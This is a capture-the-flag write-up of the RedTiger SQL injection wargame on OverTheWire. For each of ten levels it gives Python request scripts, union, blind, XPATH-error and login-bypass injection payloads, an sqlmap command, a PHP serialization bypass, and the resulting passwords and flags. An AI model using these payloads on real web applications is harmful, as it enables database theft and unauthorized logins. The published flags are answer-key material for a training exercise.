---
title: "RedTiger : OverTheWire"
last_modified_at: 2020-10-13T14:40:02-05:00
categories:
  - OverTheWire
author_profile: false
tags:
  - sqlmap
  - redtiger 
  - OverTheWire
  - SQL Injection
---

# RedTiger
Writeups of SQL injection war game (RedTiger) on overthewire. I learnt how SQL injection vulnerabilities can occur in a web application. Try it yourself [here](https://redtiger.labs.overthewire.org/)

## Level 1: Simple SQL injection

Url : [https://redtiger.labs.overthewire.org/level1.php](https://redtiger.labs.overthewire.org/level1.php)

![/assets/images/OverTheWire/RedTiger/Untitled.png](/assets/images/OverTheWire/RedTiger/Untitled.png)

Category has a link which when clicked provides response about category 1:

```html
https://redtiger.labs.overthewire.org/level1.php?cat=1
```

The parameter cat is set to 1. And the result is

![/assets/images/OverTheWire/RedTiger/Untitled%201.png](/assets/images/OverTheWire/RedTiger/Untitled%201.png)

### Testing for SQL injection

First I changed the url value from 1 to 2 but no result was obtained which means it has only 1 category. In order to test if  SQL injection exists , the value to cat was changed from 1 to 2-1 , which again returned the data with cat.

### Hypothesis

Select * from categories where name=$_GET['cat']

### Injection

Used python to send requests

```python
#!/usr/bin/python3
import requests

url = "https://redtiger.labs.overthewire.org/level1.php"

value = "1"

params = {"cat":value}

r = requests.get(url=url,params=params)

print(r.text)
```

Getting the number of columns

```python
value = "1 order by 5" 
#returns error
value = "1 order by 4"
#shows value 
```

Getting the data displayed

```python
value="1 union select 1,2,3,4"
```

![/assets/images/OverTheWire/RedTiger/Untitled%202.png](/assets/images/OverTheWire/RedTiger/Untitled%202.png)

Which shows data could be extracted in 3rd and 4th entry.

Getting username and password:

```python
value = "1 union select 1,2,3,(select concat(username,0x3a,password) from level1_users)"
```

![/assets/images/OverTheWire/RedTiger/Untitled%203.png](/assets/images/OverTheWire/RedTiger/Untitled%203.png)

You can raise your wechall.net score with this flag: 27cbddc803ecde822d87a7e8639f9315

The password for the next level is: passwords_will_change_over_time_let_us_do_a_shitty_rhyme

## Level 2: Login Bypass

![/assets/images/OverTheWire/RedTiger/Untitled%204.png](/assets/images/OverTheWire/RedTiger/Untitled%204.png)

On clicking on login with data we can see in the network tab that a post request is sent with data

```python
username: <username_field>
password: <password_field>
login: Login
```

Code used

```python
#!/usr/bin/python3
import requests

url = "https://redtiger.labs.overthewire.org/level2.php"

value = "pass"

data = {
        'username':'ro',
        'password':value,
        'login':'Login'
        }
cookies = {'level2login':'passwords_will_change_over_time_let_us_do_a_shitty_rhyme'}
           
r = requests.post(url=url,data=data,cookies=cookies)

print(r.text)
```

### Testing for SQL injection

```python
value="'"
```

Adding ' on password field shows error

```python
Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/html/hackit/level2.php on line 48
Login incorrect!
```

which shows there is sql injection

### Hypothesis

```sql
select * from users where username=$_GET['username'] and password='$_GET['password']'
```

Since injection was not possible in username so the hypothesis 

```sql
select * from users username=? and password='$_GET['password']'
prepared_statement_to_set_username(username,query)
```

### Injection

```sql
value = "' or 1='1 --"
```

access granted. You can raise your wechall.net score with this flag: 1222e2d4ad5da677efb188550528bfaa.

The password for the next level is: feed_the_cat_who_eats_your_bread

## Level 3:

![/assets/images/OverTheWire/RedTiger/Untitled%205.png](/assets/images/OverTheWire/RedTiger/Untitled%205.png)

Clicking on TheCow link we get url

```html
https://redtiger.labs.overthewire.org/level3.php?usr=MDYzMjIzMDA2MTU2MTQxMjU0
```

usr get parameter has base64 encoded value, on decoding it we get 

```bash
roshan@rogi9:~$ echo MDYzMjIzMDA2MTU2MTQxMjU0 | base64 -d
063223006156141254
```

 

Which shows it is further encrypted.

Hint says try to get an error. To get an error we can change usr parameter to array. On changing usr to usr[]

```html
https://redtiger.labs.overthewire.org/level3.php?usr[]=MDYzMjIzMDA2MTU2MTQxMjU0
```

We get an error message

Warning: preg_match() expects parameter 2 to be string, array given in /var/www/html/hackit/urlcrypt.inc on line 26

The file on [https://redtiger.labs.overthewire.org/urlcrypt.inc](https://redtiger.labs.overthewire.org/urlcrypt.inc)

```php
<?php

	// warning! ugly code ahead :)
	// requires php5.x, sorry for that
  		
	function encrypt($str)
	{
		$cryptedstr = "";
		srand(3284724);
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
			
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
  
	function decrypt ($str)
	{
		srand(3284724);
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}

				foreach($array as $s)
				{
					$a = $s ^ rand(0, 255);
					$decStr .= chr($a);
				}
				
				return $decStr;
			}
			return false;
		}
		return false;
	}
?>
```

Which shows the data is ecrypted. Used an online php interpreter to run the code to get injection

### Hypothesis

```php
Select * from level3_users where usr=decrypt($_GET['usr'])
```

### Injection

Code used

```python
#!/usr/bin/python3
import requests
import base64

url = "https://redtiger.labs.overthewire.org/level3.php"

data="MDI1MjE2MDY4MjU1MTUxMjMxMTUwMDg3MjA0MDMzMTc0MTUzMDY5MTcwMDI4MDE3MjU1MDgwMTc3MDg4MDMzMjE2MjQzMTk1MDcyMjM5MTMwMjAyMTY5MTIzMTUw"
params = {'usr':data}
cookies = {'level2login':'passwords_will_change_over_time_let_us_do_a_shitty_rhyme',
           'level3login':'feed_the_cat_who_eats_your_bread'}

r = requests.get(url=url,params=params,cookies=cookies)

print(r.text)
```

Used 

```sql
' union select 1,2,3,4,5,6,7#
-- encryped text MDI1MjE2MDY4MjU1MTUxMjMxMTUwMDg3MjA0MDMzMTc0MTUzMDY5MTcwMDI4MDE3MjU1MDgwMTc3MDg4MDMzMjE2MjQzMTk1MDcyMjM5MTMwMjAyMTY5MTIzMTUw
```

 to get the data printed and got result.

![/assets/images/OverTheWire/RedTiger/Untitled%206.png](/assets/images/OverTheWire/RedTiger/Untitled%206.png)

```sql
ro' union select 1,2,3,4,5,6,(select group_concat(username,0x3a,password) from level3_users)#
--encrypted text MDI1MjE2MDY4MjU1MTUxMjMxMTUwMDg3MjA0MDMzMTc0MTUzMDY5MTcwMDI4MDE3MjU1MDgwMTc3MDg4MDMzMjE2MjQzMTk1MDcyMjM5MTMwMjAyMTY5MTAwMTk4MTQ5MTA0MTI1MTc5MTQ2MTMwMTY4MTA4MDQzMTY1MTQwMDMwMTUzMTYzMTc0MDAzMjAyMDg2MjE0MDk5MDY3MTQzMTMyMDcwMDQ3MTg5MTc4MTAyMTAyMDkxMjA0MDM4MDExMTA0MTE4MTI1MjAwMTQ0MDY2MTQxMjIwMDAzMDk3MjEyMTMyMTA5MTI2MTMwMDczMTE5MjA3MDQ4MTQ0MTU2MDM0MDYzMjQzMDQ5MjMxMTY1MDgxMTgy
```

![/assets/images/OverTheWire/RedTiger/Untitled%207.png](/assets/images/OverTheWire/RedTiger/Untitled%207.png)

TheCow:asdf�$23�56wdf,**Admin:thisisaverysecurepasswordEEE5rt**

You can raise your wechall.net score with this flag: a707b245a60d570d25a0449c2a516eca

The password for the next level is: put_the_kitten_on_your_head

## Level 4 : Blind SQL Injection

![/assets/images/OverTheWire/RedTiger/Untitled%208.png](/assets/images/OverTheWire/RedTiger/Untitled%208.png)

On clicking Click Me we get

```sql
https://redtiger.labs.overthewire.org/level4.php?id=1
```

### Testing SQL injection

```sql
https://redtiger.labs.overthewire.org/level4.php?id=1
Result: Query returned 0 rows
https://redtiger.labs.overthewire.org/level4.php?id=2
Result: Query returned 0 rows
https://redtiger.labs.overthewire.org/level4.php?id=2-1
Result: Query returned 1 rows
```

This shows 2-1 is being performed.

```sql
https://redtiger.labs.overthewire.org/level4.php?id=1 union select 1,2 --
Result : Query returned 2 rows.
```

Which shows the data is being returned but is only reflected in form of number.

### Hypothesis

```java
Select * from level4_secret 
--php code returned the number of queries
```

### Injection

Used sqlmap to extract values

```java
$sqlmap -r req -p id -T level4_secret -C keyword --dump
```

req has the request intercepted by burpsuite

```java
GET /level4.php?id=1 HTTP/1.1
Host: redtiger.labs.overthewire.org
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://redtiger.labs.overthewire.org/level4.php?id=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Cookie: level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head
```

sqlmap returned

+-----------------------+
| keyword |
+-----------------------+
| killstickswithbr1cks! |
+-----------------------+

killstickswithbr1cks!

You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa

The password for the next level is: this_hack_it's_old

## Level 5: Adding own data in the injection to bypass login

![/assets/images/OverTheWire/RedTiger/Untitled%209.png](/assets/images/OverTheWire/RedTiger/Untitled%209.png)

### Testing for injection

' on username field shows error

```bash
Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/html/hackit/level5.php on line 46
User not found!
```

```sql
1' or 1='1 
#login failed
1' order by 3 # 
# shows error
1' order by 2 #
#user not found
1' union select 1,2 #
#Login failed

```

### Hypothesis

```sql
user=$_POST['username'];
pass=$_POST['password'];
a = Select * from ? where username=user;
if(query_returns and a.password=md5(pass))
{
	logged_in();
}
else{
loginfailed();
}

```

### Injection

```sql
Username : 1' union select 1,md5(2) #
Password : 2
```

Login successful!

You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3

The password for the next level is: the_stone_is_cold

## Level 6: Hex for injection

### Testing for Injection

```sql
user=1' shows error
Use order by to get the number of columns
Found 5

```

```sql
#!/usr/bin/python3
import requests
import base64

url = "https://redtiger.labs.overthewire.org/level6.php"

while True:
	data=input("data:\n")
	data='0x'+data.encode().hex()
	parm = "0 union select 1,{},3,4,5 from level6_users where status=1".format(data,data,data,data,data)
	print(data)
	print(parm)
	params = {'user':parm}
	
	cookies = {'level2login':'passwords_will_change_over_time_let_us_do_a_shitty_rhyme',
	   'level3login':'feed_the_cat_who_eats_your_bread',
	'level4login':'put_the_kitten_on_your_head',
	'level5login':'this_hack_it%27s_old',
	'level6login':'the_stone_is_cold'}
	r = requests.get(url=url,params=params,cookies=cookies)

	print(r.text)
```

### Exploit

```sql
' union select 1,password,2,3,4 from level6_users where status=1 #
```

password: m0nsterk1ll , username : admin

Login correct.

You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932

The password for the next level is: shitcoins_are_hold

## Level 7 : Not A better solution

Better solution  :

 Exploit string: `') union select 1,2,3,news.autor from level7_news news, level7_texts text where ( '%' = '%`

![/assets/images/OverTheWire/RedTiger/Untitled%2010.png](/assets/images/OverTheWire/RedTiger/Untitled%2010.png)

### Testing for sql injection

' on search bar shows error

```sql
An error occured!:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' OR text.title LIKE '%'%')' at line 1

SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%'%' OR text.title LIKE '%'%')
```

This shows the input data is added on between %<input_data>%

```sql
%' '%'='
-- this makes the query valid and other function could be used between the ' symbols
%' <query> '%'='
```

### Injection

```python
#!/usr/bin/python3
import requests

url = "https://redtiger.labs.overthewire.org/level7.php"

print("SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%{ADD}%' OR text.title LIKE '%{ADD}%')")
while True:

	letters=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']
	#letters=['t','T','e','E','s','S','u','U','r','R','f','O','F','o','g','G']

	all_res =[]
	for inp in letters:
		occur=1
		le=1
		res=[]
		while occur<18:
			while le<18:
				value= "google%'and news.id=3 and char_length(news.autor)=17 and locate('{}',news.autor,{})={} and '%'='".format(inp,occur,le)
				data = {
	'dosearch':'serach!',
	'search':value,

	}
				#print("le,occur",le,occur)
				query= "SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%{}%' OR text.title LIKE '%{}%')".format(value,value)
				#print(query)
				cookies = {'level2login':'passwords_will_change_over_time_let_us_do_a_shitty_rhyme',
           'level3login':'feed_the_cat_who_eats_your_bread',
        'level4login':'put_the_kitten_on_your_head',
        'level5login':'this_hack_it%27s_old',
        'level6login':'the_stone_is_cold',
	'level7login':'shitcoins_are_hold'
	}
#cookies = {'level2login':'passwords_will_change_over_time_let_us_do_a_shitty_rhyme'}

				r = requests.post(url=url,data=data,cookies=cookies)
				if "computer" in r.text:
				
					print(le,inp)
					result_found = str(le)+":"+inp
					res.append(result_found)
					occur=le
					break
				le=le+1
			occur=occur+1
			#print(r.text)
		print(res)
		all_res.append(res)
	print(all_res)
```

Since many functions were disabled, LOCATE function is not disabled. So I used the above code to get the data from news.autor.

I got result

testuserforg00gle

But this didn't worked. This was because the function is case insensitive. Adding BINARY in the function changed the function to work as case sensitive. Since I had extracted the strings so used the extracted strings. The final code becomes.

```sql
#!/usr/bin/python3
import requests

url = "https://redtiger.labs.overthewire.org/level7.php"

print("SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%{ADD}%' OR text.title LIKE '%{ADD}%')")
while True:
	
	letters=['t','T','e','E','s','S','u','U','r','R','f','O','F','o','g','G']
	#letters=[inps]
	all_res =[]
	for inp in letters:
		occur=1
		le=1
		res=[]
		while occur<18:
			while le<18:
				value= "google%'and news.id=3 and char_length(news.autor)=17 and locate(BINARY '{}',news.autor,{})={} and '%'='".format(inp,occur,le)
				data = {
	'dosearch':'serach!',
	'search':value,

	}
				#print("le,occur",le,occur)
				query= "SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%{}%' OR text.title LIKE '%{}%')".format(value,value)
				#print(query)
				cookies = {'level2login':'passwords_will_change_over_time_let_us_do_a_shitty_rhyme',
           'level3login':'feed_the_cat_who_eats_your_bread',
        'level4login':'put_the_kitten_on_your_head',
        'level5login':'this_hack_it%27s_old',
        'level6login':'the_stone_is_cold',
	'level7login':'shitcoins_are_hold'
	}
#cookies = {'level2login':'passwords_will_change_over_time_let_us_do_a_shitty_rhyme'}

				r = requests.post(url=url,data=data,cookies=cookies)
				if "computer" in r.text:
				
					print(le,inp)
					result_found = str(le)+":"+inp
					res.append(result_found)
					occur=le
					break
				le=le+1
			occur=occur+1
			#print(r.text)
		print(res)
		all_res.append(res)
	print(all_res)
```

Finally I got the case sensitive user

TestUserforg00gle

User correct.

You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80

The password for the next level is: or_so_i'm_told

## Level 8 : SQLI in Update Statement

![/assets/images/OverTheWire/RedTiger/Untitled%2011.png](/assets/images/OverTheWire/RedTiger/Untitled%2011.png)

### Testing for Injection

Adding ' on the email field gives error

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '12345', age = '25' WHERE id = 1' at line 3 
```

Which shows the email field can be exploited. Looking at the error message we can see , the syntax similar to update statement

```sql
Update table ? set email=$email,icq='12345',age='25' where id=1
```

### Hypothesis

```sql
Update table level8_users set email=$_GET['email'],icq='mysql_real_escape_string($_GET['icq'])',age='mysql_real_escape_string($_GET['age'])' where id=1
-- icq and age use those functions, this can be seen if ' is passed in these field, the error shows \'
```

### Injection

Googled for update statement injection and found this [**pdf](https://www.exploit-db.com/docs/33253).** This provides information on injecting SQL queries on insert, update and delete statements.

```sql
' or updatexml(1,concat(0x7e,database()),0) or 1='1
-- XPATH syntax error: '~hackit' Username: Admin
```

Error message is displayed with executed command so, we can extract the data form database by replacing database() with sql query

```sql
' or updatexml(1,concat(0x7e,(select password from level8_users where username='admin')),0) or 1='1
-- You can't specify target table 'level8_users' for update in FROM clause Username: Admin
```

So we need to figure out a way to bypass this restriction.

[This](https://stackoverflow.com/questions/45494/mysql-error-1093-cant-specify-target-table-for-update-in-from-clause) provides a way to bypass the restriction by creating a temporary table of level8_users table and extract the value from that table

```sql
' or updatexml(1,concat(0x7e,(select password from (select password from level8_users where username='admin') as x)),0) or 1='1
--XPATH syntax error: '~19JPYS1jdgvkj' Username: Admin
```

19JPYS1jdgvkj is the password

You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715

The password for the next level is: network_pancakes_milk_and_wine

## Level 9 : SQLI in INSERT Statement

![/assets/images/OverTheWire/RedTiger/Untitled%2012.png](/assets/images/OverTheWire/RedTiger/Untitled%2012.png)

### Testing for injection

' in the last field shows error.

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' at line 6Autor: RedTiger
```

Also the last parentheses indicate this is insert statement. Again I used the same XPATH based injection using extractvalue() function

### Hypothesis

```sql
insert into table_name? values (name,title,data)
```

The data field is exploitable.

### Injection

Testing for possible queries

```sql
' ) #
--Didn't show any error which means the query works
' <or extractvalue function> ) #
```

From this **[pdf](https://www.exploit-db.com/docs/33253).** I got to know about the XPATH Based injection.

```sql
' or extractvalue(1,concat(0x7e,(select concat(username,0x7e,password) from level9_users limit 1)))) #
--XPATH syntax error: '~TheBlueFlower~this_oassword_is_'
```

The password didnt work as full password was not extracted so used

```sql
' or updatexml(0,concat(0x7e,(select right(password,25) from level9_users)),0)) #
--XPATH syntax error: '~ord_is_SEC//Ure.promised!'
```

Combining both these

User: TheBlueFlower  Pass: this_oassword_is_SEC//Ure.promised!

You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679

The password for the next level is: whatever_just_a_fresh_password

## Level 10 : PHP serialize and unserialize

![/assets/images/OverTheWire/RedTiger/Untitled%2013.png](/assets/images/OverTheWire/RedTiger/Untitled%2013.png)

The source code shows

![/assets/images/OverTheWire/RedTiger/Untitled%2014.png](/assets/images/OverTheWire/RedTiger/Untitled%2014.png)

This is a post request and value is base64 encoded. On decoding we get

```sql
a:2:{s:8:"username";s:6:"Monkey";s:8:"password";s:12:"0815password";}
```

The format is similar to php serialize

```php
<?php
$ro = Array("username"=>"Monkey","password"=>"0815password");
$data =serialize($ro);
echo $data;?>

//returns
a:2:{s:8:"username";s:6:"Monkey";s:8:"password";s:12:"0815password";}
```

### Exploit

```php
<?php
$ro = Array("username"=>"TheMaster","password"=>True);
$data =serialize($ro);
echo base64_encode($data);

?>
result
**YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=**
```

Sending this post request we get success message.

You solved the hackit :)

You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52

The password for the hall of fame is: make_the_internet_great_again